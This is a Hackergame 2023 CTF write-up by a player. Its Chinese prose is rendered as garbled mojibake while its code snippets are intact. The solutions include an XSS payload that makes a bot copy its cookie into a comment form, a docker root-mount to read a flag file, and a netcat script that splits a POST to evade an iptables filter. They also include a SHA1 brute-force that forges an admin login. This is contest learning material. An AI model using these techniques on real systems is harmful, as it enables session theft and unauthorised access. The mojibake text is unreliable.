# Hackergame 2023 è§£é¢˜æŠ¥å‘Š by piscesciurus

*åŠæ ¼å–µï¼*

[ä¹Ÿå‘è¡¨åœ¨åšå®¢ã€‚](https://satgo1546.mist.so/archives/462)

# ç¬¬1å¤©
## Hackergameå¯åŠ¨

*é‚£ä¹ˆå°±å‘å‡ºå¾ˆå¤§çš„å£°éŸ³æ©ç›–è¿‡å»å§ï¼*

https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity=114514

## çŒ«å’ªå°æµ‹

å•Šï¼Ÿé¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºæ¥¼å±‚ï¼Ÿè¿™ä»€ä¹ˆåäººç±»çš„UIï¼Ÿ

## æ›´æ·±æ›´æš—

*è¿™ä¹ˆé‡è¦çš„ç«¯å£å·ï¼Œç”¨åœ¨è¿™ä¹ˆç®€å•çš„é¢˜ç›®ä¸ŠçœŸçš„å¥½å—ï¼Ÿ*

å•Šè¿™ï¼ŒåŸæ¥åªè¦å…¨é€‰å¤åˆ¶å°±èƒ½æ‹¿åˆ°ï¼Œæˆ‘æ»šäº†å¥½ä¹…ï¼Œæ‰’äº†æºç æ‰åšå‡ºæ¥ã€‚

```javascript
`flag{T1t@n_${CryptoJS.SHA256(`dEEper_@nd_d@rKer_${localStorage.token}`).toString().slice(0, 32)}}` // ğŸ¤¡
```

## Git? Git!

*Gitå¥½å…„å¼Ÿï¼Œæœ‰éšç§ä¿¡æ¯å®ƒæ˜¯çœŸæ³„éœ²ï¼Œæœ‰é‡è¦æ–‡ä»¶å®ƒæ˜¯çœŸåˆ é™¤ã€‚*

ä»¥ä¸ºä¼šæ›´éš¾ä¸€äº›ï¼Œæ‰€ä»¥ç›´æ¥éå†äº†æ‰€æœ‰å­˜åœ¨äºä»“åº“ä¸­çš„æ–‡ä»¶ã€‚

```sh
git cat-file --batch --batch-all-objects | grep --text flag
```

## ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨

*é«˜é¢‘ç‡æ˜Ÿçƒè¿‘æœŸé¢‘å‘å¤–æ˜Ÿäººç»‘æ¶äº‹ä»¶ï¼Œå„ä½æœ‰ä»€ä¹ˆå¤´çŒªå—ï¼Ÿ*

å¯èƒ½æ˜¯æœ€çŸ­çš„è„šæœ¬ï¼Ÿ

```javascript
setInterval(() => find('hack[', 1, 0, 1) && getSelection().focusNode.parentElement.click(), 50)
```

`window.find`çš„ä½œç”¨æ˜¯æ¨¡æ‹ŸCtrl+Fï¼Œå› ä¸ºå®åœ¨å¤ªæ²¡ç”¨è¿˜æ˜¯ä¸ªéæ ‡å‡†å‡½æ•°è€Œæ— äººé—®æ´¥ï¼Œå´æ„å¤–åœ°åœ¨è¿™é‡Œæ–¹ä¾¿äº†è„šæœ¬çš„ç¼–å†™ï¼Œä»¥è‡³äºéƒ½ä¸éœ€è¦ç±»åã€‚æˆ‘çŸ¥é“è¿™ä¸ªå‡½æ•°æ˜¯å› ä¸ºåœ¨ç ”ç©¶`<details>`ä¸ºä»€ä¹ˆå¯ä»¥è¢«Ctrl+Få±•å¼€æ—¶ï¼Œå‘ç°äº†[`hidden="until-found"`](https://css-tricks.com/newsletter/295-hidden-until-found/)å±æ€§ã€‚

## JSON âŠ‚ YAML?

æ˜æ˜æœåˆ°çš„ä¹Ÿæ˜¯[è¿™ç¯‡æ–‡ç« ](https://john-millikin.com/json-is-not-a-yaml-subset)ï¼Œä½†å°±æ˜¯çœ¼çæ²¡çœ‹åˆ°1e2ï¼Œä½†æ˜¯çœ‹åˆ°äº†NOï¼Œæ‰€ä»¥å†™äº†NaNï¼ˆè¿™éƒ½ä»€ä¹ˆé€»è¾‘ï¼‰ã€‚

```json
{"":0,"":NaN}
```

## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ / You Are Smart

*ğŸ®, hackergame accepted, you are smart!*

> You are smart. You are smart. You are smart.

## å¥¶å¥¶çš„ç¡å‰flagæ•…äº‹

*ç›¸ä¿¡çš„å¿ƒå°±æ˜¯ä½ çš„é­”æ³•ï¼*

https://acropalypse.app/
## æƒœå­—å¦‚é‡‘2.0

*è¿™å°±æ˜¯~~ä½•æ—¥å›å†æ¥~~puzzle huntç»™æˆ‘çš„è‡ªä¿¡ã€‚*

æ‰‹å·¥æ¨ç†çš„ã€‚

## è™«

*æˆ‘è§‰å¾—è¿˜æ˜¯å½“æ˜†è™«è½»æ¾ä¸€äº›ã€‚*

æ‰¾åˆ°MMSSTVï¼Œä¸Šå¤æ—¶ä»£çš„ç•Œé¢éš¾ç”¨å¾—è¦æ­»ï¼Œå±…ç„¶åªèƒ½å½•éŸ³è€Œä¸èƒ½è¯»å–WAVã€‚ä¸è¿‡æœåˆ°MMSSTVä½¿ç”¨çš„MMVæ ¼å¼å…¶å®å°±æ˜¯å•å£°é“ã€11025Hzçš„WAVï¼Œæ‰€ä»¥é‡é‡‡æ ·å¹¶æ”¹æ‰©å±•åå°±å¯ä»¥é¿å…ç¤¾æ­»äº†ã€‚

## èµ›åšäº•å­—æ£‹

å•Šè¿™ï¼ŒåŸæ¥åªè¦å¼€ä¸¤ä¸ªçª—å£å°±èƒ½åƒå­ã€‚éš¾æ€ªæˆ‘æƒ³ä¸å‡ºæ€ä¹ˆæTOCTTOUæ”»å‡»ã€‚

```javascript
board.map(x => x.fill(0))
```

## HTTPé›†é‚®å†Œ
*ç°åœ¨ï¼Œé—­ä¸Šçœ¼ç›ï¼Œæƒ³è±¡å°ç‹ç‹¸åœ¨HTTPä¸–ç•Œé‡Œå¯»æ‰¾èƒ½è®©nginxè¿”å›ä»»æ„çŠ¶æ€ç çš„è¯·æ±‚å¤´â€¦â€¦*

æ— çŠ¶æ€ç ï¼š
```
GET /\r\n\r\n
```

100ï¼š

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Expect: 100-continue\r\n\r\n
```

200ï¼š
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

206ï¼š
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Range: bytes=114-514\r\n\r\n
```

304ï¼š

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n
```

400ï¼š
```
114514
```

404ï¼š

```
GET /114514 HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

405ï¼š
```
POST / HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

412ï¼š

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
If-Match: 114514\r\n\r\n
```

414ï¼š

```
GET /114514/114514/114514ï¼ˆæ­¤å¤„çœç•¥114514ä¸ª114514ï¼‰ HTTP/1.1\r\n
Host: 114514.com\r\n\r\n
```

416ï¼š

```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Range: bytes=114514-114514\r\n\r\n
```

501ï¼š
```
GET / HTTP/1.1\r\n
Host: 114514.com\r\n
Transfer-Encoding: 114514\r\n\r\n
```

505ï¼š

```
GET / HTTP/2.0\r\n
Host: 114514.com\r\n\r\n
```

å› ä¸ºä»¥ä¸ºGETä¸èƒ½æºå¸¦æ•°æ®ï¼Œæ— æ³•è§¦å‘413ï¼Œæ‰€ä»¥åœ¨13ç§å¯èƒ½å¾—åˆ°çš„çŠ¶æ€ç ä¸­å”¯ç‹¬æ¼æ‰äº†è¿™ä¸€ç§ï¼Œä¸ºä¹‹åæå®šäº†iptableså´æä¸å®šPOSTåŸ‹ä¸‹äº†ä¼ç¬”ã€‚

è¿™å¤©æ™šä¸Šï¼Œæˆ‘åšäº†ä¸ªæ¢¦ï¼Œæ¢¦åˆ°nginxæœ‰ä¸ªè‡ªå®šä¹‰è¯·æ±‚å¤´X-Response-Codeï¼Œèƒ½è®©æœåŠ¡å™¨è¿”å›æŒ‡å®šçš„çŠ¶æ€ç ã€‚æ™šå®‰ï¼Œç›å¡å·´å¡ã€‚

# ç¬¬2å¤©

Hackergameç»èµè¿›è¡Œä¸­ï¼

## ğŸª é«˜é¢‘ç‡æ˜Ÿçƒ

å®‰è£…äº†asciinemaï¼Œä½†åªç”¨æ¥è§‚èµï¼Œä¸çŸ¥é“æœ‰catå­å‘½ä»¤ã€‚

```python
from itertools import islice
import json
s = ""
for l in islice(open("asciinema_restore.cast"), 38, 1884):
    s += json.loads(l)[2]
s = s.partition("\x1b[7m(END)")[0]
s = s.replace("\x1b[7mflag.js\x1b[27m\x1b[K", ":\x1b[K")
s = s.replace(":\x1b[K\r\x1b[K \x1b[KESC\b\b\bESC\x1b[K[\b[\x1b[K6\b6\x1b[K~\b~\r\x1b[K", "")
open("asciinema_restore.js", "w").write(s)
```

å› ä¸ºæ²¡æœ‰è¿‡æ»¤CRä»¥åŠç©ºè¡Œç­‰ç­‰ç»†èŠ‚åŸå› ï¼Œæ²¡å¤åŸå‡ºæ­£ç¡®çš„SHA-256ï¼Œä½†èƒ½è¿è¡Œå‡ºæ­£ç¡®çš„flagï¼Œä¹Ÿå¤Ÿäº†ã€‚

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€/flag ğŸ˜¡ / LD_PRELOAD, love!

*ä¸ºä»€ä¹ˆè¦å‚åŠ HackergameğŸ˜¡ä¸ºä»€ä¹ˆè¦æ‰“å¼€é¢˜ç›®ğŸ˜¡ä¸ºä»€ä¹ˆè¦ä¸‹è½½é™„ä»¶ğŸ˜¡ä¸ºä»€ä¹ˆè¦æäº¤flagğŸ˜¡*

```sh
musl-gcc -static ğŸ˜¡.c
```

## Docker for Everyone

*Google is all you need.*

```sh
docker run -itv /:/a alpine cat /a$(readlink /flag)
```

## æ—…è¡Œç…§ç‰‡3.0

æ‰¾é”™è¯ºè´å°”å¥–å¾—ä¸»ï¼Œä¸çŸ¥é“å“ªå¤©å…¬å›­æœ‰æ´»åŠ¨ï¼Œæ²¡ç‚¹è¿›é“¾æ¥å°±æ²¡çœ‹åˆ°å¿—æ„¿è€…æ‹›å‹Ÿï¼Œåœ¨é‡æ–°æ‰¾å¯¹è¯ºè´å°”å¥–ã€æšä¸¾å‡º~~1919å¹´~~8æœˆ10æ—¥åå¾—åˆ°äº†é—®å·ç¼–å·ã€‚å­¦æœ¯ä¹‹æ—…ä»¥ä¸ºæ˜¯ä¹˜ç”µè½¦ï¼Œå‡ºå£å½“æˆä¸Šé‡ç«™ï¼Œçº³é—·é“ï¼šå­¦é•¿è«éæ˜¯æ®‹éšœäººå£«ï¼Œæ‰€ä»¥åšç‰©é¦†å…ç¥¨ï¼Ÿ

> 1. 2023-08-10 https://www.uenopark.info/2023/ume-shu-2023/
> 2. ICRR https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/
> 3. S495584522 https://umeshu-matsuri.jp/tokyo_staff/
> 4. 0 https://www.tnm.jp/modules/r_free_page/index.php?id=113
> 5. å®‰ç”°è®²å ‚ https://statphys28.org/banquet.html
> 6. ç†ŠçŒ«-ç§‹ç”°çŠ¬ https://plaza.rakuten.co.jp/ayumilife/diary/202308110000/

## ğŸª æµå¼æ˜Ÿçƒ

å«ŒOpenCVå¤ªå¤§ï¼Œå«GPTå†™äº†ä¸ªç”¨pygameçš„å®½åº¦è°ƒæ•™ç¨‹åºã€‚ç¨‹åºå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä½†ä¹Ÿè°ƒå‡ºæ¥äº†ã€‚èµ›åæ‰æƒ³èµ·æ¥OpenCVæœ‰æ»‘åŠ¨æ¡ä¼šå¥½ç”¨äº›ï¼Œä¸ç”¨å…¨é è‡ªå·±æä¸Šä¸‹å·¦å³æŒ‰é”®äº¤äº’ã€‚

```python
import pygame
import numpy as np

a = np.fromfile("video.bin", dtype=np.uint8).reshape((-1, 3))[:114514]
w = 640

pygame.init()
screen = pygame.display.set_mode((800, 600))
pygame.key.set_repeat(200, 50)
while True:
    event = pygame.event.wait()
    if event.type == pygame.QUIT:
        pygame.quit()
        break
    elif event.type == pygame.KEYDOWN:
        w += (event.key == pygame.K_RIGHT) - (event.key == pygame.K_LEFT)
        w += ((event.key == pygame.K_UP) - (event.key == pygame.K_DOWN)) * 10
    elif event.type == pygame.MOUSEMOTION:
        continue
    pygame.display.set_caption(f"video {w = }")
    screen.fill((255, 255, 255))
    screen.blit(pygame.surfarray.make_surface(
        np.moveaxis(np.resize(a, (600, w, 3)), 0, 1)
    ), (0, 0))
    pygame.display.flip()
```

## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ 2.0

*æ¯•ç«Ÿæ­£å¸¸äººæ€ä¹ˆå¯èƒ½ç•™ `<img src=a onerror="alert(1)">` è¿™ç§è¯„è®ºå˜›ï¼*

æˆ‘æ˜¯è°ï¼Ÿæˆ‘åœ¨å“ªï¼Ÿè¦å¹²å˜›ï¼Ÿç„¶åå‘ç°`"+114514+"`æˆåŠŸäº†ï¼Œéš¾ç»·ã€‚

è¿å‡½æ•°è°ƒç”¨éœ€è¦çš„æ‹¬å·éƒ½è¢«è¿‡æ»¤äº†ï¼Œ25å­—ç¬¦ä»€ä¹ˆéƒ½åšä¸åˆ°ã€‚å°±åœ¨ä¸º`\74"+location["hash"]+"\76`ä»¥å£¹å­—èŠ‚ç•¥å¾®è¶…å‡ºé™åˆ¶ï¼Œè¿˜æ— æ³•æ³¨å…¥ç©ºæ ¼è€Œå‘æ„æ—¶ï¼Œå‘ç°äº†location URLå­—ç¬¦ä¸²ç¡¬å¡ä¹Ÿèƒ½å¡è¿›å±æ€§é‡Œã€‚

é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å…¸ä¸­å…¸`<img onerror>`äº†ã€‚è¯„è®º`\74img "+location+"\76`ï¼Œç„¶åè®©botæµè§ˆä¸‹é¢çš„ç½‘é¡µã€‚

```javascript
<script>open("http://web/result#/src/onerror=comment[1].value=btoa(document.cookie).slice(0,25),document.forms[0].submit()")</script>
```

æƒ³åˆ°è§£æ³•æ—¶æ¯”èµ›å¹³å°å·²ç»å…³é—­äº†ã€‚ä¸è¿‡å¥½åƒè™½ç„¶æ¯”èµ›å¹³å°å…³é—­äº†ï¼Œä½†æ˜¯202.38.93.111è¿˜åœ¨ã€‚ä½†æ˜¯æˆ‘æŠŠIPå¼„ä¸¢äº†ã€‚å®‰ç„¶å…¥çœ ã€‚

å› ä¸ºè°ƒè¯•æ—¶è®¾ç½®äº†document.cookieï¼Œä»è¿™é¢˜å¼€å§‹ï¼Œæˆ‘çš„æµè§ˆå™¨ç»™202.38.93.111å‘çš„HTTPè¯·æ±‚é‡Œå°±ä¸€ç›´å¸¦ç€Cookie: flag=114514çš„æ ‡å¤´ï¼Œä¸ç®¡å“ªé¢˜éƒ½æ˜¯ã€‚

### å®Œæˆç»ƒä¹ ä¸éœ€è¦äº†è§£ä»»ä½•å¾®ç§¯åˆ†ä¸ç¬¦å·è®¡ç®—çš„çŸ¥è¯†

[åªéœ€è¦fx-991CN Xã€‚](å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ .pdf)

fx-999CN CWç²¾åº¦æ›´é«˜ï¼Œä¸è¿‡è€æœºå‹ç²¾åº¦ä¹Ÿå¤Ÿç”¨äº†ã€‚æ–°æœºå‹è¿lnéƒ½è¦æŒ‰SHIFTæ‰èƒ½è¾“å…¥æœªå…ä¹Ÿå¤ªå˜æ€äº†ç‚¹ã€‚

# ç¬¬3å¤©

æ—©ä¸Šå®ç°å¹¶æäº¤äº†å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹ 2.0ï¼ŒåŒæ ·è¢«URLç¼–ç ä¸­çš„åŠ å·å‘äº†ä¸€æŠŠï¼Œä¸è¿‡çœ‹åˆ°ç­”æ¡ˆé”™è¯¯æ—¶ä¸€ä¸‹å­å°±å‘ç°äº†ï¼Œæ²¡æƒ³åˆ°åæ¥å®˜æ–¹è¿˜ä¸“ä¸ºè¿™ä¸ªé—®é¢˜è¡¥äº†ä¸ªæç¤ºã€‚

## å¼‚æ˜Ÿæ­§é€”

*è¿™æ ·çš„çˆ†ç ´é¢˜ä¸ç®¡åœ¨å“ªä¸ªæ¯”èµ›é‡Œéƒ½æ˜¯ç›¸å½“ç‚¸è£‚çš„å­˜åœ¨ã€‚*

ç©äº†ä¸€å°æ—¶ï¼Œå‘ç°é¢˜ç›®ç»™å‡ºçš„åœ°å›¾é‡Œæ²¡æœ‰ä»»ä½•ä¸œè¥¿æ˜¯è§è¿‡çš„ï¼Œå¼€æ‘†ï¼Œç›´æ¥åšå§ã€‚

ï¼ˆæ‹¨åŠ¨å¼€å…³ï¼‰ï¼ˆå˜­ï¼ï¼‰ï¼ˆå›åˆ°å‡ºç”Ÿç‚¹ï¼‰ï¼ˆä¿å­˜å¹¶é€€å‡ºï¼‰ï¼ˆåˆ é™¤å­˜æ¡£ï¼‰ï¼ˆå¯¼å…¥åœ°å›¾ï¼‰ï¼ˆåŠ è½½ï¼‰ï¼ˆç§»åŠ¨åˆ°ç¬¬ä¸‰åŒºï¼‰ï¼ˆæ‹¨åŠ¨å¼€å…³ï¼‰ï¼ˆç °ï¼ï¼‰

å°è¯•çˆ†ç ´ï¼ˆæŒ‡æšä¸¾ç¬¬ä¸‰åŒºçš„ç­”æ¡ˆï¼‰ï¼Œç»“æœè¿˜æ²¡çˆ†ç ´å®Œå°±å·²ç»æ¨ç†å‡ºæ¥äº†ã€‚

# ç¬¬4å¤©

gameå·²ç»ç»“æŸäº†ï¼Œå‰©ä¸‹çš„å…¨æ˜¯åç‰¢ã€‚

ä½å¸¦å®½æ˜Ÿçƒçš„å®¹å™¨ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´è·‘ä¸é€šï¼Œç›´åˆ°ä»Šå¤©ï¼Œç»ˆäºå‘ç°æ˜¯å› ä¸ºç³Šçš„è¿è¡Œè„šæœ¬é‡Œ`$1`å†™æˆäº†`$0`ã€‚

ä»¥ä¸ºseccompé¢˜åªè¦ä¸è°ƒç”¨openå’Œopenatå°±è¡Œï¼Œä½†ä¸çŸ¥é“ä¸ºä»€ä¹ˆè€æ˜¯æŠ¥operation already in processé”™ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°é”™è¯¯ç æ˜¯114ã€‚è¿™å°±å¾ˆåˆç†äº†ï¼Œè‚¯å®šæ˜¯è‡ªå®šä¹‰é”™è¯¯ç ï¼Œæ‰å‘ç°ä»£ç é‡Œé‚£ä¹ˆå¤§ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ç™½åå•ï¼Œæ‰“æ‰°äº†ï¼Œå‘Šè¾ã€‚

## Komm, sÃ¼sser Flagge / æˆ‘çš„POST & æˆ‘çš„P

*å¦‚æœä½ ä¸çŸ¥é“`nc`æ˜¯ä»€ä¹ˆï¼Œæˆ–è€…åœ¨è§£ä¸Šé¢çš„é¢˜ç›®æ—¶é‡åˆ°äº†å›°éš¾ï¼Œå¯ä»¥å‚è€ƒæˆ‘ä»¬ç¼–å†™çš„[èŒæ–°å…¥é—¨æ‰‹å†Œï¼šå¦‚ä½•ä½¿ç”¨nc/ncatå·åˆ°flagï¼Ÿ](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/#%E7%A4%BA%E4%BE%8B)*

ç¬¬ä¸€å°é¢˜ä»¥ä¸ºå¦‚ç½‘ä¸Šæ‰€è¯´æ˜¯é iptablesçš„BMç®—æ³•æœ‰æ¼æ´ï¼Œä½†é¡¾åæ€ä¹‰ï¼Œiptablesåªåœ¨IPåŒ…å±‚é¢ä¸Šå¤„ç†ï¼Œåªè¦æŠŠPOSTæ‹†å¼€æ¥å°±è¡Œã€‚æ‰‹å¤´æ²¡æœ‰ä»»ä½•ä¸“ä¸šç½‘ç»œå·¥å…·çš„æˆ‘æƒ³å‡ºäº†ä¸€ç§å¤©æ‰èˆ¬çš„è§£æ³•ï¼š

```sh
(
echo -n 'PO'
sleep .114514
echo 'ST / HTTP/1.1
Host: 114514.com
Content-Length: 15

114514:asdfgh==
'
) | nc 202.38.93.111 18080
```

æ‹†åŒ…å…¨é è¿™ä¸ªå©´å„¿èˆ¬çš„ç¡çœ ï¼Œæ”¹æˆsleep 0å°±è¿‡ä¸äº†äº†ã€‚

å…¶å®è°ƒäº†è€åŠå¤©invalid tokençš„é—®é¢˜ï¼Œè¿˜ä»¥ä¸ºæ˜¯è¦æä»€ä¹ˆURLç¼–ç ï¼Œå…¶å®æ˜¯æ­»äºæ²¡å†™Content-Lengthã€‚HTTPé›†é‚®å†Œæ²¡é›†åˆ°413çš„ä¼ç¬”å›æ”¶äº†å±äºæ˜¯ã€‚

ç¬¬äºŒå°é¢˜æ‡’å¾—ç ”ç©¶u32è§„åˆ™ï¼Œæ ¹æ®é¢˜ç›®æ ‡é¢˜ä»¥åŠ0x50ççŒœä¸€æ³¢TCPæ•°æ®ä¸å¯ä»¥ä»¥På¼€å¤´ã€‚ç¡®å®æ˜¯è¿™ä¸ªæ„æ€ï¼Œä½†å‘ç°æŠŠç¬¬ä¸€å°é¢˜çš„ç«¯å£å·æ”¹æˆç¬¬äºŒå°é¢˜çš„ç«¯å£å·å°±è‡ªåŠ¨åšå®Œäº†ï¼Œå°±æ²¡æœ‰ç»§ç»­ç ”ç©¶flagé‡Œçš„reserved byteæ˜¯ä»€ä¹ˆæ„æ€ã€‚

## O(1)ç”¨æˆ·ç™»å½•ç³»ç»Ÿ

*ä¸ºä»€ä¹ˆè¦ç™»å½•ğŸ˜¡*

ç¡å‰è½½å…¥ä¸€é“æ•°å­¦é¢˜ï¼Œå°±å¯ä»¥åœ¨æ¢¦ä¸­æ‰“CTFäº†ã€‚

æ„Ÿè°¢[lucky-commit](https://github.com/not-an-aardvark/lucky-commit)æä¾›çš„æ•£åˆ—ç¢°æ’è€—æ—¶ä¼°è®¡ã€‚

ä¸æ˜¯å‡‘å¼€å¤´ä¸ºâ€œadmin:â€æ•£åˆ—å€¼ï¼Œè€Œåªéœ€è¦å‡‘åœ¨admin:åæ·»åŠ å­—ç¬¦å¯å¾—åˆ°çš„å¯UTF-8è§£ç å¹¶ä»…åŒ…å«é›¶æˆ–ä¸€ä¸ªâ€œ:â€çš„æ•£åˆ—å€¼ã€‚çœ‹èµ·æ¥æ˜¯adminé¢˜ï¼Œç»“æœæœ€å¤§çš„è®¡ç®—é‡å…¶å®åœ¨UTF-8ä¸Šã€‚

```python
import pwnlib.util.iters
import string
from hashlib import sha1

def f(x: str) -> bool:
    try:
        s = sha1(("admin:" + x).encode()).digest().decode()
    except UnicodeDecodeError:
        return False
    return s.count(":") == 1 and s.isprintable()

print(pwnlib.util.iters.mbruteforce(f, string.ascii_letters + string.digits, 8))

def g(x: str) -> bool:
    try:
        s = sha1((":" + x).encode()).digest().decode()  # ç”¨æˆ·åå¯ä»¥ä¸ºç©º
    except UnicodeDecodeError:
        return False
    return ":" not in s and s.isprintable()

print(pwnlib.util.iters.mbruteforce(g, string.ascii_letters + string.digits, 8))

# 1
# :m10WVp.7aÆ^Næ»·v2-K ,U"Î¾mzË¢w1}?j>}m/
# :m10WVp.7aÆ^Næ»·v2-K ,U"Î¾mzË¢w1}?j>}m/
# EOF
# 2
# admin:759D:4b202c5522cebe6d7acba277317d3f6a3e7d6d2f83d88a86a6e1c277d0e9e852e676e72146602afc
```

# ç¬¬5å¤©
æ—©ä¸ŠæŠŠO(1)ç”¨æˆ·ç™»å½•ç³»ç»Ÿçš„è§£æ³•å®ç°å¹¶æäº¤äº†ã€‚
## ğŸª å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ / Accepted

*è™šå‡çš„ç®—åŠ›é¢˜æ’æ•£åˆ—ï¼ŒçœŸæ­£çš„ç®—åŠ›é¢˜è·‘æ¨¡å‹ã€‚*

å°†TinyStoriesæ•°æ®é›†å…¨éƒ¨æ‹–ä¸‹æ¥ï¼Œæœç´¢â€œ acceptedâ€ï¼Œèƒ½æ‰¾åˆ°è¿‘ä¸€ä¸‡ä¸ªï¼Œå–å‰ä¸ƒä¸ªå­—ç¬¦æŒ¨ä¸ªè¯•è¿‡å»ï¼Œå¯å¾—ä¸¤è§£ï¼šâ€œApologyâ€å’Œâ€œativelyâ€ã€‚Apologyå¾ˆèƒ½è§£é‡Šå¾—é€šï¼Œå› ä¸ºâ€œApology acceptedâ€åœ¨æ•°æ®é›†ä¸­å‡ºç°äº†å››æ¬¡ã€‚

ä¹±è¯•çš„æ—¶å€™å‘ç°è¾“å…¥â€œpoâ€æˆ–â€œioioioâ€çš„è¯ï¼Œæ¨¡å‹ä¼šå›å¤â€œioioioioioioioioioioioioioioioioioioioioioioioioioioioioioioâ€ã€‚

## ğŸª ä½å¸¦å®½æ˜Ÿçƒ

*ä¸‹æ¬¡è¿˜å¡«éå¸¸ç®€å•ï¼*

ç¬¬ä¸€å°é¢˜å½“ç„¶ç¬¬ä¸€å¤©å°±åšå®Œäº†ï¼Œéšä¾¿æ‰¾ä¸ªæ— æŸå‹ç¼©å·¥å…·ï¼Œè¿PNGéƒ½èƒ½åšåˆ°2KBä»¥å†…ï¼ŒPNGGauntletè¿˜èƒ½å†æˆ˜äºŒåå¹´ï¼Œç„¶åå°±å¼€å§‹æ€è€ƒå¦‚ä½•æé™å‹ç¼©ã€‚æ—¶é—´å·²ç»è¿‡å»äº†äº”å¤©ã€‚ä»”ç»†ç ”ç©¶äº†GIFæ ‡å‡†ï¼Œç”šè‡³å°è¯•äº†MATLABå’ŒPDFï¼Œæ— æœã€‚é€šè¿‡SVGZèƒ½å‹ç¼©åˆ°98å­—èŠ‚ï¼š
```sh
echo -n '<svg><rect height="1024" width="1024" fill="#16a33e"/><rect height="1024" width="666" fill="#d618d7"/><rect height="1024" width="368" fill="#01c9d3"/></svg>' | gzip | wc -c
```

æ³¨æ„heightåœ¨widthä¹‹å‰ï¼Œå› ä¸ºheightæ˜¯é‡å¤çš„ï¼Œå¯ä»¥è·Ÿå‰é¢çš„`<rect`åˆå¹¶å‹ç¼©ï¼Œæ¯”widthåœ¨å‰çš„ç‰ˆæœ¬å°‘1å­—èŠ‚â€¦â€¦@Ishisashi[åŒæ ·é‡‡ç”¨SVGZ](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/players/mcfx/wp.md#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)ï¼Œä½†ä¸æ˜¯`<rect>`è€Œæ˜¯`<path>`ï¼Œå‹åˆ°äº†96å­—èŠ‚ã€‚

libvipsæ”¯æŒå¾ˆå¤šå›¾ç‰‡æ ¼å¼ï¼Œå¯è¿™äº›å›¾ç‰‡æ ¼å¼éƒ½å­˜åœ¨å·¨å¤§çš„é—®é¢˜ï¼Œè¦ä¹ˆæ˜¯æ–‡ä»¶å¤´å°¾å°±å·²è¶…è¿‡50å­—èŠ‚ï¼ˆå”‰ï¼ŒPDFï¼‰ï¼Œè¦ä¹ˆæ˜¯å‹ç¼©ç®—æ³•ä¸åˆ©äºè¶…å¤§è‰²å—ï¼ˆå”‰ï¼ŒTGAï¼‰ï¼Œè¦ä¹ˆæ˜¯ä¸¤è€…çš†æœ‰ï¼ˆå”‰ï¼ŒPNGï¼‰ã€‚GIFå…¶å®å¾ˆæœ‰å¸Œæœ›ï¼Œå› ä¸º[å®ƒçš„æ–‡ä»¶å¤´å¾ˆå°ï¼Œä¸é€æ˜çš„è¯æ›´å°](http://probablyprogramming.com/2009/03/15/the-tiniest-gif-ever)ï¼Œè¿˜æœ‰å›¾åƒæè¿°ç¬¦è¿™ç§è¯´æ³•ï¼Œå¯ä»¥æŒ‡å®šå­å›¾è¦†ç›–çš„çŸ©å½¢åŒºåŸŸï¼Œå‰©ä½™åƒç´ ä»¥é»˜è®¤èƒŒæ™¯è‰²å¡«å……ã€‚ä½†æ˜¯è¯•äº†ä¸€é€šå‘ç°ä¸èƒ½ç»™æ¯ä¸ªå›¾åƒæè¿°ç¬¦åˆ†åˆ«æŒ‡å®šèƒŒæ™¯è‰²ï¼Œlibvipsä¹Ÿä¸è®¤å…¨å›¾èƒŒæ™¯è‰²ï¼Œæ­‡èœã€‚

æœåˆ°[FLIFçš„ä½œè€…æŒ‡å‡ºFLIFå¯ä»¥ä»¥0å­—èŠ‚/åƒç´ çš„æ•ˆç‡åœ¨å‹ç¼©å•è‰²å›¾ç‰‡ä»»åŠ¡ä¸­å‡»è´¥å…¶ä»–æ ¼å¼ï¼Œæ–‡ä»¶å¤´ä¹Ÿå¾ˆå°](https://cloudinary.com/blog/a_one_color_image_is_worth_two_thousand_words)ã€‚åæ¥ï¼ŒFLIFä¸­çš„æŠ€æœ¯åˆå¹¶åˆ°äº†JPEG/XLï¼Œ[JPEG/XLçš„å‹ç¼©æœ‰ç€æ›´å¹¿é˜”çš„å¯èƒ½æ€§](https://news.ycombinator.com/item?id=31115857)ã€‚è™½ç„¶libvipsçš„ä¸»é¡µä¸Šæ²¡æœ‰æ˜ç¡®è¯´æ˜ï¼Œä½†æ˜¯å› ä¸ºæ¥äº†ImageMagickï¼Œå®é™…ä¸Šæ˜¯èƒ½è§£ç FLIFæ ¼å¼çš„ã€‚ç”¨è¿™äº›è¾ƒæ–°çš„æ ¼å¼çš„ç¼–ç å™¨è‡ªåŠ¨è½¬æ¢æ‰€å¾—çš„å›¾ç‰‡éƒ½ä¸å°ã€‚ä½†æ˜¯ï¼Œ[ç›´æ¥ç¼–ç JPEG/XLçš„å†³ç­–æ ‘å¯ä»¥åˆ›é€ ç”Ÿæˆå¼è‰ºæœ¯](https://jpegxl.info/art/)ï¼Œ[å…¶å·¥å…·çš„é»˜è®¤å®½é«˜æ˜¯1024åƒç´ 